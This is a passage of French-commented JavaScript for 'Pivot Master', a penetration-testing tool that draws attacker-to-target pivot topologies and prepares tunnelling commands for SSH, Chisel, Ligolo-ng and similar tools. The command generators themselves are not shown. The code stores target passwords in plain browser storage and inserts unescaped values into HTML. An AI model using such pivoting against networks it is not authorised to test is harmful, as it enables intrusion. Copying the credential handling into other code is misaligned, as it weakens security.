/**
 * Pivot Master - Générateur de commandes de pivot
 * Interface simple pour saisir les informations et générer des commandes
 */

class NetworkVisualizer {
    constructor(pivotMaster) {
        this.pivotMaster = pivotMaster;
        this.network = null;
        this.nodes = null;
        this.edges = null;
        this.container = null;
        this.physicsEnabled = true;
    }

    async init() {
        this.container = document.getElementById('networkCanvas');
        if (!this.container) {
            console.warn('Conteneur réseau non trouvé');
            return;
        }

        this.setupNetworkOptions();
        this.setupEventListeners();
        this.createNetwork();
    }

    setupEventListeners() {
        // Options réseau
        document.getElementById('showLabels')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('showEdgeLabels')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('hierarchicalLayout')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('smoothEdges')?.addEventListener('change', () => this.updateNetwork());
    }

    setupNetworkOptions() {
        this.nodes = new vis.DataSet([]);
        this.edges = new vis.DataSet([]);
    }

    createNetwork() {
        const data = {
            nodes: this.nodes,
            edges: this.edges
        };

        const options = {
            nodes: {
                shape: 'dot',
                size: 25,
                font: {
                    size: 14,
                    color: '#000000'
                },
                borderWidth: 3,
                shadow: true
            },
            edges: {
                width: 3,
                color: { inherit: 'from' },
                smooth: {
                    type: 'continuous'
                },
                arrows: {
                    to: { enabled: true, scaleFactor: 1.2 }
                },
                shadow: true
            },
            physics: {
                enabled: this.physicsEnabled,
                stabilization: { iterations: 100 }
            },
            interaction: {
                hover: true,
                selectConnectedEdges: false
            }
        };

        this.network = new vis.Network(this.container, data, options);
        
        // Événements réseau
        this.network.on('click', (params) => {
            if (params.nodes.length > 0) {
                this.showNodeInfo(params.nodes[0]);
            }
        });

        this.network.on('hoverNode', () => {
            this.container.style.cursor = 'pointer';
        });

        this.network.on('blurNode', () => {
            this.container.style.cursor = 'default';
        });
    }

    updateNetworkFromConfig() {
        if (!this.network) return;

        const config = this.pivotMaster.config;
        this.nodes.clear();
        this.edges.clear();

        // Nœud attaquant
        this.nodes.add({
            id: 'attacker',
            label: `🔥 Attaquant\n${config.attacker.ip || '10.10.14.15'}`,
            color: {
                background: '#dc3545',
                border: '#c82333'
            },
            group: 'attacker',
            x: -200,
            y: 0,
            fixed: { x: true, y: false },
            title: `Machine Attaquante\nIP: ${config.attacker.ip || '10.10.14.15'}\nPort: ${config.attacker.port || '4444'}`
        });

        // Target 1 (point d'entrée)
        if (config.target1.ip) {
            const network1 = this.getNetworkSegment(config.target1.ip);
            const osIcon = this.getOSIcon(config.target1.os || 'linux');
            this.nodes.add({
                id: 'target1',
                label: `${osIcon} Target 1\n${config.target1.ip}\n${config.target1.user || 'user'}@${config.target1.ip}:${config.target1.port || '22'}`,
                color: this.getNodeColor(config.target1.os || 'linux'),
                group: network1,
                x: 0,
                y: -100,
                title: `Target 1 (Premier Pivot)\nIP: ${config.target1.ip}\nPort: ${config.target1.port || '22'}\nUtilisateur: ${config.target1.user || 'user'}\nOS: ${config.target1.os || 'linux'}`
            });

            // Connexion attaquant -> target1
            this.edges.add({
                id: 'att-t1',
                from: 'attacker',
                to: 'target1',
                label: 'Initial Access',
                color: { color: '#28a745' },
                width: 4,
                title: 'Accès initial depuis l\'attaquant'
            });
        }

        // Target 2 (destination)
        if (config.target2.ip) {
            const network2 = this.getNetworkSegment(config.target2.ip);
            const osIcon = this.getOSIcon(config.target2.os || 'linux');
            this.nodes.add({
                id: 'target2',
                label: `${osIcon} Target 2\n${config.target2.ip}\n${config.target2.user || 'user'}@${config.target2.ip}:${config.target2.port || '22'}`,
                color: this.getNodeColor(config.target2.os || 'linux'),
                group: network2,
                x: 200,
                y: 0,
                title: `Target 2 (Second Pivot)\nIP: ${config.target2.ip}\nPort: ${config.target2.port || '22'}\nUtilisateur: ${config.target2.user || 'user'}\nOS: ${config.target2.os || 'linux'}`
            });

            // Connexion target1 -> target2 (pivot)
            if (config.target1.ip) {
                this.edges.add({
                    id: 't1-t2',
                    from: 'target1',
                    to: 'target2',
                    label: 'Pivot',
                    color: { color: '#ffc107' },
                    width: 4,
                    dashes: [10, 5],
                    title: 'Pivot via Target 1'
                });
            }
        }

        // Target 3 (double pivot)
        if (config.doublePivot && config.target3.ip) {
            const network3 = this.getNetworkSegment(config.target3.ip);
            this.nodes.add({
                id: 'target3',
                label: `🎯 Target 3\n${config.target3.ip}\n:${config.target3.port || '3389'}`,
                color: {
                    background: '#6f42c1',
                    border: '#5a31a5'
                },
                group: network3,
                x: 400,
                y: 100,
                title: `Target 3 (Double Pivot)\nIP: ${config.target3.ip}\nPort: ${config.target3.port || '3389'}`
            });

            // Connexion target2 -> target3 (double pivot)
            this.edges.add({
                id: 't2-t3',
                from: 'target2',
                to: 'target3',
                label: 'Double Pivot',
                color: { color: '#e83e8c' },
                width: 4,
                dashes: [15, 10],
                title: 'Double pivot via Target 2'
            });
        }

        // Grouper par réseau si différent
        this.addNetworkGroups();
        
        // Générer l'explication intelligente
        this.generateExplanation();
        
        // Ajuster la vue
        setTimeout(() => this.fitNetwork(), 100);
    }

    generateExplanation() {
        const config = this.pivotMaster.config;
        const selectedTechniques = Array.from(this.pivotMaster.selectedTechniques);
        const explanationContent = document.getElementById('explanationContent');
        const explanationStatus = document.getElementById('explanationStatus');
        
        if (!explanationContent) return;

        // Vérifier si on a assez d'infos
        if (!config.target1.ip || !config.target2.ip) {
            explanationContent.innerHTML = `
                <div class="explanation-placeholder">
                    <i>📝</i>
                    <p>Configurez au minimum Target 1 et Target 2 pour voir l'explication du pivot...</p>
                </div>
            `;
            explanationStatus.innerHTML = `
                <span class="status-indicator">⚠️</span>
                <span>Configuration incomplète</span>
            `;
            return;
        }

        // Analyser la configuration
        const network1 = this.getNetworkSegment(config.target1.ip);
        const network2 = this.getNetworkSegment(config.target2.ip);
        const network3 = config.doublePivot ? this.getNetworkSegment(config.target3.ip) : null;
        
        const isDifferentNetwork = network1 !== network2;
        const isTripleNetwork = network3 && network3 !== network2 && network3 !== network1;

        // Générer le résumé réseau
        let networkSummary = `
            <div class="network-summary">
                <h5>📊 Analyse de la Topologie Réseau</h5>
                <p>
                    ${isDifferentNetwork ? 
                        `🔀 <strong>Pivot multi-réseau détecté :</strong> ${network1} → ${network2}${network3 ? ` → ${network3}` : ''}` :
                        `🏠 <strong>Pivot intra-réseau :</strong> Toutes les machines dans ${network1}`
                    }
                    ${selectedTechniques.length > 0 ? 
                        ` | <strong>Techniques sélectionnées :</strong> ${selectedTechniques.length}` : 
                        ' | ⚠️ Aucune technique sélectionnée'
                    }
                </p>
            </div>
        `;

        // Générer les étapes du pivot
        let pivotFlow = '<div class="pivot-flow">';
        let stepNumber = 1;

        // Étape 1: Accès initial
        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber++}</div>
                    <div class="step-title">🎯 Accès Initial - Compromission de Target 1</div>
                </div>
                <div class="step-description">
                    Vous avez obtenu un accès sur <code>${config.target1.ip}</code> (${config.target1.user || 'utilisateur'}) 
                    via votre machine attaquante <code>${config.attacker.ip}</code>.
                    ${config.target1.services ? ` Services découverts : ${config.target1.services}` : ''}
                </div>
            </div>
        `;

        // Étape 2: Configuration du pivot
        const pivotDescription = isDifferentNetwork ? 
            `Cette machine sert de <strong>pont</strong> pour atteindre le réseau ${network2} depuis ${network1}.` :
            `Cette machine sert de <strong>relais</strong> pour atteindre d'autres services dans le même réseau.`;

        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber++}</div>
                    <div class="step-title">🔀 Configuration du Pivot vers Target 2</div>
                </div>
                <div class="step-description">
                    Target 1 va servir de point de pivot pour accéder à <code>${config.target2.ip}:${config.target2.port}</code>. 
                    ${pivotDescription}
                </div>
                ${selectedTechniques.length > 0 ? `
                    <div class="step-techniques">
                        ${selectedTechniques.map(tech => `<span class="technique-badge ${tech}">${this.getTechniqueName(tech)}</span>`).join('')}
                    </div>
                ` : ''}
            </div>
        `;

        // Étape 3: Double pivot si configuré
        if (config.doublePivot && config.target3.ip) {
            const doublePivotDescription = isTripleNetwork ? 
                `Target 2 servira de second relais pour atteindre le réseau ${network3}.` :
                `Target 2 servira de second relais dans le réseau ${network2}.`;

            pivotFlow += `
                <div class="flow-step">
                    <div class="step-header">
                        <div class="step-number">${stepNumber++}</div>
                        <div class="step-title">🔀🔀 Double Pivot vers Target 3</div>
                    </div>
                    <div class="step-description">
                        Une fois Target 2 accessible, vous configurerez un <strong>double pivot</strong> pour atteindre 
                        <code>${config.target3.ip}:${config.target3.port}</code>. ${doublePivotDescription}
                    </div>
                    ${selectedTechniques.length > 0 ? `
                        <div class="step-techniques">
                            ${selectedTechniques.map(tech => `<span class="technique-badge ${tech}">${this.getTechniqueName(tech)} (Chain)</span>`).join('')}
                        </div>
                    ` : ''}
                </div>
            `;
        }

        // Étape finale: Exécution
        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber}</div>
                    <div class="step-title">⚡ Exécution des Commandes</div>
                </div>
                <div class="step-description">
                    Les commandes générées configureront automatiquement ${selectedTechniques.length > 0 ? 'les techniques sélectionnées' : 'les techniques par défaut'} 
                    pour établir ${config.doublePivot ? 'la chaîne de double pivot' : 'le tunnel de pivot'}. 
                    Vous pourrez ensuite accéder aux services cibles comme s'ils étaient locaux.
                </div>
            </div>
        `;

        pivotFlow += '</div>';

        // Assembler le contenu final
        explanationContent.innerHTML = networkSummary + pivotFlow;

        // Mettre à jour le status
        const techniqueCount = selectedTechniques.length;
        const pivotType = config.doublePivot ? 'Double Pivot' : 'Simple Pivot';
        explanationStatus.innerHTML = `
            <span class="status-indicator">✅</span>
            <span>${pivotType} | ${techniqueCount} technique${techniqueCount > 1 ? 's' : ''}</span>
        `;
    }

    getTechniqueName(tech) {
        const names = {
            'ssh': 'SSH',
            'chisel': 'Chisel',
            'ligolo': 'Ligolo-ng',
            'socat': 'Socat',
            'netcat': 'Netcat',
            'metasploit': 'Metasploit'
        };
        return names[tech] || tech;
    }

    getNetworkSegment(ip) {
        if (!ip) return 'unknown';
        const parts = ip.split('.');
        if (parts.length >= 3) {
            return `${parts[0]}.${parts[1]}.${parts[2]}.x`;
        }
        return 'unknown';
    }

    getOSIcon(os) {
        switch(os) {
            case 'linux': return '🐧';
            case 'windows': return '🪟';
            default: return '💻';
        }
    }

    getNodeColor(os) {
        switch(os) {
            case 'linux':
                return {
                    background: '#17a2b8',
                    border: '#138496'
                };
            case 'windows':
                return {
                    background: '#007bff',
                    border: '#0056b3'
                };
            default:
                return {
                    background: '#6c757d',
                    border: '#545b62'
                };
        }
    }

    addNetworkGroups() {
        // Ajouter des nœuds de réseau pour la segmentation
        const networks = new Set();
        this.nodes.forEach(node => {
            if (node.group && node.group !== 'attacker') {
                networks.add(node.group);
            }
        });

        let yOffset = 200;
        networks.forEach(network => {
            this.nodes.add({
                id: `net-${network}`,
                label: `📡 ${network}`,
                color: {
                    background: '#f8f9fa',
                    border: '#dee2e6'
                },
                shape: 'box',
                size: 15,
                font: { size: 10 },
                x: 0,
                y: yOffset,
                physics: false
            });
            yOffset += 50;
        });
    }

    showNodeInfo(nodeId) {
        const infoPanel = document.getElementById('networkInfoContent');
        if (!infoPanel) return;

        const node = this.nodes.get(nodeId);
        if (!node) return;

        let infoHTML = '';

        if (nodeId === 'attacker') {
            infoHTML = `
                <div class="node-info attacker-info">
                    <div class="info-header">
                        <h5>🔥 Machine Attaquante</h5>
                    </div>
                    <div class="info-details">
                        <div class="info-item">
                            <span class="info-label">IP:</span>
                            <span class="info-value">${node.label.split('\n')[1]}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Port d'écoute:</span>
                            <span class="info-value">${this.pivotMaster.config.attacker.port || '4444'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Rôle:</span>
                            <span class="info-value">Point de départ des attaques</span>
                        </div>
                    </div>
                </div>
            `;
        } else if (nodeId.startsWith('host_')) {
            // Host depuis le Host Manager
            const hostIP = nodeId.replace('host_', '');
            infoHTML = `
                <div class="node-info host-info">
                    <div class="info-header">
                        <h5>🖥️ Host: ${hostIP}</h5>
                    </div>
                    <div class="info-details">
                        <div class="info-item">
                            <span class="info-label">IP:</span>
                            <span class="info-value">${hostIP}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Hostname:</span>
                            <span class="info-value">${node.label.split('\n')[1] || 'Unknown'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">OS:</span>
                            <span class="info-value">${node.title.split('\n')[1]?.replace('OS: ', '') || 'Unknown'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Services:</span>
                            <span class="info-value">${node.title.split('\n')[2]?.replace('Services: ', '') || 'None'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Réseau:</span>
                            <span class="info-value">${node.group}</span>
                        </div>
                    </div>
                </div>
            `;
        } else if (nodeId === 'target1') {
            const config = this.pivotMaster.config.target1;
            infoHTML = `
                <div class="node-info target-info">
                    <div class="info-header">
                        <h5>🎯 Target 1 (Premier Pivot)</h5>
                    </div>
                    <div class="info-details">
                        <div class="info-item">
                            <span class="info-label">IP:</span>
                            <span class="info-value">${config.ip}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Port:</span>
                            <span class="info-value">${config.port || '22'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Utilisateur:</span>
                            <span class="info-value">${config.user || 'user'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">OS:</span>
                            <span class="info-value">${config.os || 'linux'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Rôle:</span>
                            <span class="info-value">Point d'entrée et premier pivot</span>
                        </div>
                    </div>
                </div>
            `;
        } else if (nodeId === 'target2') {
            const config = this.pivotMaster.config.target2;
            infoHTML = `
                <div class="node-info target-info">
                    <div class="info-header">
                        <h5>🎯 Target 2 (Second Pivot)</h5>
                    </div>
                    <div class="info-details">
                        <div class="info-item">
                            <span class="info-label">IP:</span>
                            <span class="info-value">${config.ip}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Port:</span>
                            <span class="info-value">${config.port || '22'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Utilisateur:</span>
                            <span class="info-value">${config.user || 'user'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">OS:</span>
                            <span class="info-value">${config.os || 'linux'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Rôle:</span>
                            <span class="info-value">Second pivot vers le réseau cible</span>
                        </div>
                    </div>
                </div>
            `;
        } else if (nodeId === 'target3') {
            const config = this.pivotMaster.config.target3;
            infoHTML = `
                <div class="node-info target-info">
                    <div class="info-header">
                        <h5>🎯 Target 3 (Double Pivot)</h5>
                    </div>
                    <div class="info-details">
                        <div class="info-item">
                            <span class="info-label">IP:</span>
                            <span class="info-value">${config.ip}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Port:</span>
                            <span class="info-value">${config.port || '3389'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Rôle:</span>
                            <span class="info-value">Cible finale via double pivot</span>
                        </div>
                    </div>
                </div>
            `;
        }

        infoPanel.innerHTML = infoHTML;
    }

    updateNetwork() {
        if (!this.network) return;

        const showLabels = document.getElementById('showLabels')?.checked ?? true;
        const showEdgeLabels = document.getElementById('showEdgeLabels')?.checked ?? false;
        const hierarchical = document.getElementById('hierarchicalLayout')?.checked ?? false;
        const smoothEdges = document.getElementById('smoothEdges')?.checked ?? true;

        const options = {
            nodes: {
                font: { color: showLabels ? '#000000' : 'transparent' }
            },
            edges: {
                label: showEdgeLabels ? undefined : '',
                smooth: smoothEdges
            },
            layout: hierarchical ? {
                hierarchical: {
                    direction: 'LR',
                    sortMethod: 'directed'
                }
            } : {}
        };

        this.network.setOptions(options);
    }

    fitNetwork() {
        if (this.network) {
            this.network.fit();
        }
    }

    resetNetwork() {
        if (this.network) {
            this.network.fit();
            this.network.redraw();
        }
    }

    togglePhysics() {
        this.physicsEnabled = !this.physicsEnabled;
        if (this.network) {
            this.network.setOptions({ physics: { enabled: this.physicsEnabled } });
        }
    }

    exportImage() {
        if (this.network) {
            const canvas = this.network.canvas.frame.canvas;
            const link = document.createElement('a');
            link.download = 'pivot-topology.png';
            link.href = canvas.toDataURL();
            link.click();
        }
    }
}

class PivotMaster {
    constructor() {
        this.config = {
            attacker: { ip: '', port: '' },
            target1: { ip: '', user: '', os: '', services: '' },
            target2: { ip: '', port: '', os: '' },
            target3: { ip: '', port: '' },
            doublePivot: false
        };
        this.selectedTechniques = new Set(['ssh', 'chisel']);
        this.generatedCommands = {};
        this.activeTab = 'ssh';
        this.networkVisualizer = null;
    }

    /**
     * Initialisation principale
     */
    async init() {
        console.log('🔀 Initialisation de Pivot Master...');
        
        this.setupEventListeners();
        this.loadDefaultValues();
        
        // Charger les hosts depuis le Host Manager
        this.loadHostsFromManager();
        
        // Initialiser la visualisation réseau
        this.networkVisualizer = new NetworkVisualizer(this);
        await this.networkVisualizer.init();
        
        console.log('✅ Pivot Master initialisé avec succès');
    }

    /**
     * Configuration des écouteurs d'événements
     */
    setupEventListeners() {
        // Écouteurs pour les champs de formulaire
        const formInputs = [
            'attackerIp', 'attackerPort',
            'target1Ip', 'target1Port', 'target1User', 'target1Password',
            'target2Ip', 'target2Port', 'target2User', 'target2Password',
            'doublePivot'
        ];

        formInputs.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('change', () => {
                    try {
                        this.saveConfig();
                        this.updateNetworkVisualization();
                    } catch (error) {
                        console.error('Erreur lors de la sauvegarde de la configuration:', error);
                    }
                });
                
                // Ajouter aussi l'événement input pour les mises à jour en temps réel
                element.addEventListener('input', () => {
                    try {
                        this.updateNetworkVisualization();
                    } catch (error) {
                        console.error('Erreur lors de la mise à jour de la visualisation:', error);
                    }
                });
            }
        });

        // Écouteurs pour les outils
        const toolCheckboxes = document.querySelectorAll('input[name="tools"]');
        toolCheckboxes.forEach(checkbox => {
            checkbox.addEventListener('change', () => {
                try {
                    this.saveConfig();
                } catch (error) {
                    console.error('Erreur lors de la sauvegarde de la configuration:', error);
                }
            });
        });

        // Écouteur pour le double pivot
        const doublePivotCheckbox = document.getElementById('doublePivot');
        if (doublePivotCheckbox) {
            doublePivotCheckbox.addEventListener('change', () => {
                try {
                    this.toggleDoublePivot();
                    this.saveConfig();
                    this.updateNetworkVisualization();
                } catch (error) {
                    console.error('Erreur lors de la gestion du double pivot:', error);
                }
            });
        }
    }

    /**
     * Valeurs par défaut
     */
    loadDefaultValues() {
        // Charger depuis localStorage ou utiliser les valeurs par défaut
        const saved = localStorage.getItem('pivotMasterConfig');
        if (saved) {
            try {
                this.config = JSON.parse(saved);
                this.restoreFormValues();
            } catch (e) {
                console.warn('Erreur lors du chargement de la config:', e);
            }
        }
        
        // Mise à jour initiale de la visualisation
        setTimeout(() => this.updateNetworkVisualization(), 500);
    }

    /**
     * Restaurer les valeurs du formulaire
     */
    restoreFormValues() {
        document.getElementById('attackerIp').value = this.config.attacker.ip || '10.10.14.15';
        document.getElementById('attackerPort').value = this.config.attacker.port || '4444';
        
        document.getElementById('target1Ip').value = this.config.target1.ip || '';
        document.getElementById('target1Port').value = this.config.target1.port || '22';
        document.getElementById('target1User').value = this.config.target1.user || '';
        document.getElementById('target1Password').value = this.config.target1.password || '';
        
        document.getElementById('target2Ip').value = this.config.target2.ip || '';
        document.getElementById('target2Port').value = this.config.target2.port || '22';
        document.getElementById('target2User').value = this.config.target2.user || '';
        document.getElementById('target2Password').value = this.config.target2.password || '';
        
        document.getElementById('doublePivot').checked = this.config.doublePivot || false;
        this.toggleDoublePivot();
        
        if (this.config.doublePivot) {
            document.getElementById('target3Ip').value = this.config.target3.ip || '';
            document.getElementById('target3Port').value = this.config.target3.port || '3389';
        }
    }

    /**
     * Charger les hosts depuis le Host Manager
     */
    loadHostsFromManager() {
        try {
            const hostsData = localStorage.getItem('hostmanager_hosts');
            if (hostsData) {
                const hosts = JSON.parse(hostsData);
                this.populateHostDropdowns(hosts);
                this.updateNetworkFromHosts(hosts);
            }
        } catch (error) {
            console.warn('Impossible de charger les hosts depuis le Host Manager:', error);
        }
    }

    /**
     * Remplir les dropdowns avec les hosts disponibles
     */
    populateHostDropdowns(hosts) {
        // Créer des dropdowns pour sélectionner les hosts
        const target1Select = this.createHostDropdown('target1Ip', hosts, 'Sélectionner Target 1');
        const target2Select = this.createHostDropdown('target2Ip', hosts, 'Sélectionner Target 2');
        
        // Remplacer les inputs par les dropdowns
        const target1Container = document.getElementById('target1Ip').parentNode;
        const target2Container = document.getElementById('target2Ip').parentNode;
        
        if (target1Container && target1Select) {
            target1Container.replaceChild(target1Select, document.getElementById('target1Ip'));
        }
        if (target2Container && target2Select) {
            target2Container.replaceChild(target2Select, document.getElementById('target2Ip'));
        }
    }

    /**
     * Créer un dropdown pour sélectionner un host
     */
    createHostDropdown(id, hosts, placeholder) {
        const select = document.createElement('select');
        select.id = id;
        select.className = 'form-control';
        
        // Option par défaut
        const defaultOption = document.createElement('option');
        defaultOption.value = '';
        defaultOption.textContent = placeholder;
        select.appendChild(defaultOption);
        
        // Options pour chaque host
        hosts.forEach(host => {
            const option = document.createElement('option');
            option.value = host.ip;
            option.textContent = `${host.ip} - ${host.hostname || 'Unknown'} (${host.os || 'Unknown OS'})`;
            option.dataset.host = JSON.stringify(host);
            select.appendChild(option);
        });
        
        // Écouter les changements
        select.addEventListener('change', (e) => {
            if (e.target.value) {
                const selectedHost = JSON.parse(e.target.selectedOptions[0].dataset.host);
                this.fillHostInfo(id, selectedHost);
            }
        });
        
        return select;
    }

    /**
     * Remplir les informations du host sélectionné
     */
    fillHostInfo(targetId, host) {
        if (targetId === 'target1Ip') {
            document.getElementById('target1User').value = host.user || '';
            document.getElementById('target1Password').value = host.password || '';
            // Détecter l'OS automatiquement
            this.config.target1.os = this.detectOS(host.os);
        } else if (targetId === 'target2Ip') {
            document.getElementById('target2User').value = host.user || '';
            document.getElementById('target2Password').value = host.password || '';
            this.config.target2.os = this.detectOS(host.os);
        }
        
        this.saveConfig();
        this.updateNetworkVisualization();
    }

    /**
     * Détecter l'OS à partir d'une chaîne
     */
    detectOS(osString) {
        if (!osString) return 'linux';
        
        const osLower = osString.toLowerCase();
        if (osLower.includes('windows')) return 'windows';
        if (osLower.includes('mac') || osLower.includes('darwin')) return 'macos';
        return 'linux';
    }

    /**
     * Mettre à jour le réseau à partir des hosts
     */
    updateNetworkFromHosts(hosts) {
        if (!this.networkVisualizer) return;
        
        // Ajouter les hosts comme nœuds dans le réseau
        hosts.forEach(host => {
            this.networkVisualizer.nodes.add({
                id: `host_${host.ip}`,
                label: `${this.getOSIcon(this.detectOS(host.os))} ${host.hostname || host.ip}\n${host.ip}`,
                color: this.getNodeColor(this.detectOS(host.os)),
                group: this.getNetworkSegment(host.ip),
                title: `${host.hostname || 'Unknown'}\nOS: ${host.os || 'Unknown'}\nServices: ${host.services || 'None'}`
            });
        });
        
        this.networkVisualizer.updateNetwork();
    }

    /**
     * Obtenir l'icône de l'OS
     */
    getOSIcon(os) {
        const icons = {
            'windows': '🪟',
            'macos': '🍎',
            'linux': '🐧'
        };
        return icons[os] || '🖥️';
    }

    /**
     * Obtenir la couleur du nœud selon l'OS
     */
    getNodeColor(os) {
        const colors = {
            'windows': { background: '#0078d4', border: '#005a9e' },
            'macos': { background: '#ff6b35', border: '#e55a2b' },
            'linux': { background: '#fcc624', border: '#e6b800' }
        };
        return colors[os] || { background: '#6c757d', border: '#545b62' };
    }

    /**
     * Obtenir le segment réseau
     */
    getNetworkSegment(ip) {
        if (!ip) return 'unknown';
        const parts = ip.split('.');
        return `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
    }

    /**
     * Sauvegarder la configuration
     */
    saveConfig() {
        const config = {
            attacker: {
                ip: document.getElementById('attackerIp')?.value || '',
                port: document.getElementById('attackerPort')?.value || ''
            },
            target1: {
                ip: document.getElementById('target1Ip')?.value || '',
                port: document.getElementById('target1Port')?.value || '',
                user: document.getElementById('target1User')?.value || '',
                password: document.getElementById('target1Password')?.value || ''
            },
            target2: {
                ip: document.getElementById('target2Ip')?.value || '',
                port: document.getElementById('target2Port')?.value || '',
                user: document.getElementById('target2User')?.value || '',
                password: document.getElementById('target2Password')?.value || ''
            },
            doublePivot: document.getElementById('doublePivot')?.checked || false,
            selectedTools: Array.from(document.querySelectorAll('input[name="tools"]:checked')).map(input => input.value)
        };

        try {
            localStorage.setItem('pivotConfig', JSON.stringify(config));
        } catch (error) {
            console.error('Erreur lors de la sauvegarde de la configuration:', error);
        }
    }

    /**
     * Toggle double pivot
     */
    toggleDoublePivot() {
        const doublePivotCheckbox = document.getElementById('doublePivot');
        const target2Group = document.getElementById('target2Group');
        const toolCards = document.querySelectorAll('.tool-card');

        if (!doublePivotCheckbox || !target2Group) return;

        if (doublePivotCheckbox.checked) {
            target2Group.style.display = 'block';
            // Désactiver les outils qui ne supportent pas le double pivot
            toolCards.forEach(card => {
                const supportsDoublePivot = card.dataset.supportsDoublePivot === 'true';
                const checkbox = card.querySelector('input[type="checkbox"]');
                if (!supportsDoublePivot && checkbox.checked) {
                    checkbox.checked = false;
                    this.showNotification('Cet outil ne supporte pas le double pivot', 'warning');
                }
                card.style.opacity = supportsDoublePivot ? '1' : '0.5';
                card.style.pointerEvents = supportsDoublePivot ? 'auto' : 'none';
            });
        } else {
            target2Group.style.display = 'none';
            // Réactiver tous les outils
            toolCards.forEach(card => {
                card.style.opacity = '1';
                card.style.pointerEvents = 'auto';
            });
        }

        // Mettre à jour la visualisation réseau
        this.updateNetworkVisualization();
    }

    /**
     * Toggle technique selection
     */
    toggleTechnique(technique, enabled) {
        const card = document.querySelector(`[data-technique="${technique}"]`);
        
        if (enabled) {
            this.selectedTechniques.add(technique);
            card?.classList.add('selected');
        } else {
            this.selectedTechniques.delete(technique);
            card?.classList.remove('selected');
        }
    }

    /**
     * Valider les entrées du formulaire
     */
    validateInput() {
        const target1Ip = document.getElementById('target1Ip')?.value;
        const target1User = document.getElementById('target1User')?.value;
        const target1Password = document.getElementById('target1Password')?.value;
        
        if (!target1Ip) {
            this.showNotification('Veuillez saisir l\'IP de la Target 1', 'warning');
            return false;
        }
        
        if (!target1User) {
            this.showNotification('Veuillez saisir l\'utilisateur de la Target 1', 'warning');
            return false;
        }
        
        if (!target1Password) {
            this.showNotification('Veuillez saisir le mot de passe de la Target 1', 'warning');
            return false;
        }
        
        // Vérifier si double pivot est activé
        const doublePivot = document.getElementById('doublePivot')?.checked;
        if (doublePivot) {
            const target2Ip = document.getElementById('target2Ip')?.value;
            const target2User = document.getElementById('target2User')?.value;
            const target2Password = document.getElementById('target2Password')?.value;
            
            if (!target2Ip) {
                this.showNotification('Veuillez saisir l\'IP de la Target 2 pour le double pivot', 'warning');
                return false;
            }
            
            if (!target2User) {
                this.showNotification('Veuillez saisir l\'utilisateur de la Target 2', 'warning');
                return false;
            }
            
            if (!target2Password) {
                this.showNotification('Veuillez saisir le mot de passe de la Target 2', 'warning');
                return false;
            }
        }
        
        return true;
    }

    /**
     * Générer les commandes pour un outil spécifique
     */
    generateToolCommands(tool) {
        switch(tool) {
            case 'ssh':
                return this.generateSSHCommands();
            case 'chisel':
                return this.generateChiselCommands();
            case 'ligolo':
                return this.generateLigoloCommands();
            case 'socat':
                return this.generateSocatCommands();
            case 'netcat':
                return this.generateNetcatCommands();
            case 'proxychains':
                return this.generateProxyChainsCommands();
            case 'rpivot':
                return this.generateRPivotCommands();
            case 'plink':
                return this.generatePlinkCommands();
            default:
                return {
                    title: 'Outil non supporté',
                    description: 'Cet outil n\'est pas encore supporté',
                    sections: []
                };
        }
    }

    /**
     * Générer les commandes de pivot
     */
    generateCommands() {
        try {
            // Valider les entrées
            if (!this.validateInput()) {
                return;
            }

            // Mettre à jour la configuration depuis le formulaire
            this.updateConfigFromForm();
            
            // Mettre à jour la visualisation réseau
            this.updateNetworkVisualization();

            // Obtenir les outils sélectionnés
            const selectedTools = Array.from(document.querySelectorAll('input[name="tools"]:checked')).map(input => input.value);
            
            if (selectedTools.length === 0) {
                this.showNotification('Veuillez sélectionner au moins un outil de pivot', 'warning');
                return;
            }

            console.log('🔧 Génération des commandes pour:', selectedTools);

            // Générer les commandes pour chaque outil
            const allCommands = {};
            
            selectedTools.forEach(tool => {
                allCommands[tool] = this.generateToolCommands(tool);
            });

            // Afficher les résultats
            this.displayResults(allCommands);
            
            // Sauvegarder la configuration
            this.saveConfig();
            
            this.showNotification('Commandes générées avec succès !', 'success');
            
        } catch (error) {
            console.error('Erreur lors de la génération des commandes:', error);
            this.showNotification('Erreur lors de la génération des commandes', 'error');
        }
    }

    displayResults(allCommands) {
        const resultsSection = document.getElementById('resultsSection');
        const tabsNav = document.getElementById('commandsTabs');
        const tabsContent = document.getElementById('commandsContent');

        if (!resultsSection || !tabsNav || !tabsContent) {
            console.error('Éléments manquants pour l\'affichage des résultats');
            return;
        }

        // Afficher la section des résultats
        resultsSection.style.display = 'block';

        // Vider les conteneurs
        tabsNav.innerHTML = '';
        tabsContent.innerHTML = '';

        // Vérifier s'il y a des commandes à afficher
        if (Object.keys(allCommands).length === 0) {
            tabsContent.innerHTML = `
                <div class="alert alert-info">
                    <i class="fas fa-info-circle"></i> Aucune commande générée. Veuillez sélectionner des outils et configurer les paramètres.
                </div>
            `;
            return;
        }

        // Créer les onglets et le contenu pour chaque outil
        Object.entries(allCommands).forEach(([tool, data], index) => {
            // Créer l'onglet
            const tab = document.createElement('button');
            tab.className = `tab-button ${index === 0 ? 'active' : ''}`;
            tab.innerHTML = `
                <i class="${this.getToolIcon(tool)}"></i>
                ${data.title}
            `;
